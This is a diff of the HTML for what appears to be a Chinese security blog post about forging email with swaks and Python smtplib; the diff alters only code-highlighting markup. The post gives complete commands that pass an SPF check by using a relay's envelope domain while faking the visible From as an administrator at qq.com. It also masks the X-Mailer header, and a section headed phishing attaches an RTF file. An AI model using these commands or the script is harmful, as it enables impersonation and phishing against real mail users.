@@ -82,8 +82,8 @@
 <p>swaks - Swiss Army Knife SMTP, the all-purpose smtp transaction tester.</p>
 <p>swaks堪称SMTP协议的瑞士军刀，使用它我们可以灵活的操作SMTP协议报文，这篇文章主要是记录一下我是如何伪造一封邮件绕过gmail的检测。</p>
 <p>通常最简单的发送命令：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">swaks --to user@example.com --server test-server.example.net
-</code></pre></div><p>但是邮件头中会带上<code>X-Mailer</code>：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>swaks --to user@example.com --server test-server.example.net
+</span></span></code></pre></div><p>但是邮件头中会带上<code>X-Mailer</code>：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/74cbdcfa-4f5f-11ec-9bc1-00d861bf4abb.png" alt="2019-05-09-14-24-53"></p>
 <p>同时，SPF检测会FAIL。</p>
 <h2 id="0x01-smtp2go">0x01 smtp2go</h2>
@@ -93,65 +93,65 @@
 <p>分配好账户后，可以通过swaks进行登录发送邮件：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/750c7a8a-4f5f-11ec-889d-00d861bf4abb.png" alt="2019-05-09-14-28-50"></p>
 <h2 id="0x02-swaks发送邮件">0x02 swaks发送邮件</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">swaks --to rvn0xsy@gmail.com --from admin@qq.com --ehlo gmail.com --body hello --server mail.smtp2go.com -p <span style="color:#ae81ff">2525</span> -au &lt;USER&gt; -ap &lt;PASS&gt;
-</code></pre></div><p>但是上面这个邮件无法绕过SPF。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>swaks --to rvn0xsy@gmail.com --from admin@qq.com --ehlo gmail.com --body hello --server mail.smtp2go.com -p <span style="color:#ae81ff">2525</span> -au &lt;USER&gt; -ap &lt;PASS&gt;
+</span></span></code></pre></div><p>但是上面这个邮件无法绕过SPF。</p>
 <h2 id="0x03-spf验证原理">0x03 SPF验证原理</h2>
 <p>如果mail.smtp2go.com是我的邮件服务器，那么gmail服务器收到的源IP也肯定是mail.smtp2go.com的IP。</p>
 <p>gmail会校验邮件发送者的IP是否存在于smtp.from的域名spf配置列表里。</p>
 <p>而上面这条命令：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">swaks --to rvn0xsy@gmail.com --from admin@qq.com --ehlo gmail.com --body hello --server mail.smtp2go.com -p <span style="color:#ae81ff">2525</span> -au &lt;USER&gt; -ap &lt;PASS&gt;
-</code></pre></div><p>smtp.from就是admin@qq.com，和mail.smtp2go.com的IP肯定不同，所以SPF校验失败，而校验失败的邮件，会有很高的几率被扔到垃圾邮件中。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>swaks --to rvn0xsy@gmail.com --from admin@qq.com --ehlo gmail.com --body hello --server mail.smtp2go.com -p <span style="color:#ae81ff">2525</span> -au &lt;USER&gt; -ap &lt;PASS&gt;
+</span></span></code></pre></div><p>smtp.from就是admin@qq.com，和mail.smtp2go.com的IP肯定不同，所以SPF校验失败，而校验失败的邮件，会有很高的几率被扔到垃圾邮件中。</p>
 <p>默认情况下，如果未设置Mail.From也就是邮件头的From，则会使用smtp.from作为Mail.From。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/7546e2d8-4f5f-11ec-8699-00d861bf4abb.png" alt="2019-05-09-14-38-39"></p>
 <h2 id="0x04-绕过spf">0x04 绕过SPF</h2>
 <p>由于邮件显示的是Header中的From不是smtp.from，因此可以将smtp.from设置为正常的邮件服务器地址，伪造一个Mail.From即可。</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">swaks --to payloads@aliyun.com --from xx@smtp2go.com --h-From: <span style="color:#e6db74">&#39;管理员&lt;admin@qq.com&gt;&#39;</span> --ehlo gmail.com --body hello --server mail.smtp2go.com -p <span style="color:#ae81ff">2525</span> -au &lt;USER&gt; -ap &lt;PASSS&gt;
-</code></pre></div><p>Gmail接收到这封邮件后，会校验<code>--from xx@smtp2go.com</code>中的smtp2go.com是否等于mail.smtp2go.com的IP，由于是相等的，所以完成了SPF的校验。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>swaks --to payloads@aliyun.com --from xx@smtp2go.com --h-From: <span style="color:#e6db74">&#39;管理员&lt;admin@qq.com&gt;&#39;</span> --ehlo gmail.com --body hello --server mail.smtp2go.com -p <span style="color:#ae81ff">2525</span> -au &lt;USER&gt; -ap &lt;PASSS&gt;
+</span></span></code></pre></div><p>Gmail接收到这封邮件后，会校验<code>--from xx@smtp2go.com</code>中的smtp2go.com是否等于mail.smtp2go.com的IP，由于是相等的，所以完成了SPF的校验。</p>
 <p>而DKIM是校验邮件完整性的，smtp2go与Gmail直接使用的是TLS，不会发生什么问题。</p>
 <p><img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/758edade-4f5f-11ec-947a-00d861bf4abb.png" alt="2019-05-09-14-42-55"></p>
 <h2 id="0x05-header">0x05 Header</h2>
 <p>swaks支持自定义某些Header，参数如下：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">swaks --header-&lt;Name&gt; &lt;Value&gt;
-</code></pre></div><p>如果我想去除Mailer特征，就可以这么做：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">swaks --header-X-Mailer gmail.com --to payloads@aliyun.com --from xx@smtp2go.com --h-From: <span style="color:#e6db74">&#39;管理员&lt;admin@qq.com&gt;&#39;</span> --ehlo gmail.com --body hello --server mail.smtp2go.com -p <span style="color:#ae81ff">2525</span> -au &lt;USER&gt; -ap &lt;PASSS&gt; 
-</code></pre></div><h2 id="0x06-附件钓鱼">0x06 附件、钓鱼</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">swaks --header-X-Mailer gmail.com --to payloads@aliyun.com --from xx@smtp2go.com --h-From: <span style="color:#e6db74">&#39;管理员&lt;admin@qq.com&gt;&#39;</span> --ehlo gmail.com --body hello --server mail.smtp2go.com -p <span style="color:#ae81ff">2525</span> -au &lt;USER&gt; -ap &lt;PASSS&gt; --attach /tmp/sss.rtf
-</code></pre></div><p>定制发送：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">swaks --data /tmp/mail.data --header-X-Mailer gmail.com --to payloads@aliyun.com --from xx@smtp2go.com --h-From: <span style="color:#e6db74">&#39;管理员&lt;admin@qq.com&gt;&#39;</span> --ehlo gmail.com --body hello --server mail.smtp2go.com -p <span style="color:#ae81ff">2525</span> -au &lt;USER&gt; -ap &lt;PASSS&gt; --attach /tmp/sss.rtf
-</code></pre></div><p>/tmp/mail.data中是原始的邮件报文。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>swaks --header-&lt;Name&gt; &lt;Value&gt;
+</span></span></code></pre></div><p>如果我想去除Mailer特征，就可以这么做：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>swaks --header-X-Mailer gmail.com --to payloads@aliyun.com --from xx@smtp2go.com --h-From: <span style="color:#e6db74">&#39;管理员&lt;admin@qq.com&gt;&#39;</span> --ehlo gmail.com --body hello --server mail.smtp2go.com -p <span style="color:#ae81ff">2525</span> -au &lt;USER&gt; -ap &lt;PASSS&gt; 
+</span></span></code></pre></div><h2 id="0x06-附件钓鱼">0x06 附件、钓鱼</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>swaks --header-X-Mailer gmail.com --to payloads@aliyun.com --from xx@smtp2go.com --h-From: <span style="color:#e6db74">&#39;管理员&lt;admin@qq.com&gt;&#39;</span> --ehlo gmail.com --body hello --server mail.smtp2go.com -p <span style="color:#ae81ff">2525</span> -au &lt;USER&gt; -ap &lt;PASSS&gt; --attach /tmp/sss.rtf
+</span></span></code></pre></div><p>定制发送：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>swaks --data /tmp/mail.data --header-X-Mailer gmail.com --to payloads@aliyun.com --from xx@smtp2go.com --h-From: <span style="color:#e6db74">&#39;管理员&lt;admin@qq.com&gt;&#39;</span> --ehlo gmail.com --body hello --server mail.smtp2go.com -p <span style="color:#ae81ff">2525</span> -au &lt;USER&gt; -ap &lt;PASSS&gt; --attach /tmp/sss.rtf
+</span></span></code></pre></div><p>/tmp/mail.data中是原始的邮件报文。</p>
 <h2 id="0x07-python也可以做">0x07 Python也可以做</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/python</span>
-<span style="color:#75715e"># -*- coding: UTF-8 -*-</span>
-
-<span style="color:#f92672">import</span> smtplib
-<span style="color:#f92672">from</span> email.mime.text <span style="color:#f92672">import</span> MIMEText
-<span style="color:#f92672">from</span> email.header <span style="color:#f92672">import</span> Header
-
-mail_host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mail.smtp2go.com&#34;</span>
-mail_user<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
-mail_pass<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
-
-
-sender <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;test@smtp2go.com&#39;</span>
-receivers <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;rvn0xsy@gmail.com&#39;</span>]
-
-message <span style="color:#f92672">=</span> MIMEText(<span style="color:#e6db74">&#39;Hello World&#39;</span>, <span style="color:#e6db74">&#39;plain&#39;</span>, <span style="color:#e6db74">&#39;utf-8&#39;</span>)
-message[<span style="color:#e6db74">&#39;From&#39;</span>] <span style="color:#f92672">=</span> Header(<span style="color:#e6db74">&#34;from@qq.com&#34;</span>, <span style="color:#e6db74">&#39;utf-8&#39;</span>)
-message[<span style="color:#e6db74">&#39;To&#39;</span>] <span style="color:#f92672">=</span>  Header(receivers[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#39;utf-8&#39;</span>)
-
-subject <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;SMTP 邮件测试&#39;</span>
-message[<span style="color:#e6db74">&#39;Subject&#39;</span>] <span style="color:#f92672">=</span> Header(subject, <span style="color:#e6db74">&#39;utf-8&#39;</span>)
-
-
-<span style="color:#66d9ef">try</span>:
-    smtpObj <span style="color:#f92672">=</span> smtplib<span style="color:#f92672">.</span>SMTP()
-    smtpObj<span style="color:#f92672">.</span>connect(mail_host, <span style="color:#ae81ff">25</span>)
-    smtpObj<span style="color:#f92672">.</span>login(mail_user,mail_pass)
-    smtpObj<span style="color:#f92672">.</span>sendmail(sender, receivers, message<span style="color:#f92672">.</span>as_string())
-    print <span style="color:#e6db74">&#34;Success&#34;</span>
-<span style="color:#66d9ef">except</span> smtplib<span style="color:#f92672">.</span>SMTPException:
-    print <span style="color:#e6db74">&#34;Error&#34;</span>
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: UTF-8 -*-</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> smtplib
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> email.mime.text <span style="color:#f92672">import</span> MIMEText
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> email.header <span style="color:#f92672">import</span> Header
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>mail_host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;mail.smtp2go.com&#34;</span>
+</span></span><span style="display:flex;"><span>mail_user<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>mail_pass<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sender <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;test@smtp2go.com&#39;</span>
+</span></span><span style="display:flex;"><span>receivers <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;rvn0xsy@gmail.com&#39;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>message <span style="color:#f92672">=</span> MIMEText(<span style="color:#e6db74">&#39;Hello World&#39;</span>, <span style="color:#e6db74">&#39;plain&#39;</span>, <span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>message[<span style="color:#e6db74">&#39;From&#39;</span>] <span style="color:#f92672">=</span> Header(<span style="color:#e6db74">&#34;from@qq.com&#34;</span>, <span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>message[<span style="color:#e6db74">&#39;To&#39;</span>] <span style="color:#f92672">=</span>  Header(receivers[<span style="color:#ae81ff">0</span>], <span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>subject <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;SMTP 邮件测试&#39;</span>
+</span></span><span style="display:flex;"><span>message[<span style="color:#e6db74">&#39;Subject&#39;</span>] <span style="color:#f92672">=</span> Header(subject, <span style="color:#e6db74">&#39;utf-8&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>    smtpObj <span style="color:#f92672">=</span> smtplib<span style="color:#f92672">.</span>SMTP()
+</span></span><span style="display:flex;"><span>    smtpObj<span style="color:#f92672">.</span>connect(mail_host, <span style="color:#ae81ff">25</span>)
+</span></span><span style="display:flex;"><span>    smtpObj<span style="color:#f92672">.</span>login(mail_user,mail_pass)
+</span></span><span style="display:flex;"><span>    smtpObj<span style="color:#f92672">.</span>sendmail(sender, receivers, message<span style="color:#f92672">.</span>as_string())
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Success&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">except</span> smtplib<span style="color:#f92672">.</span>SMTPException:
+</span></span><span style="display:flex;"><span>    print <span style="color:#e6db74">&#34;Error&#34;</span>
+</span></span></code></pre></div>
 </div>
 <div class="container">
     <section class="bio" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
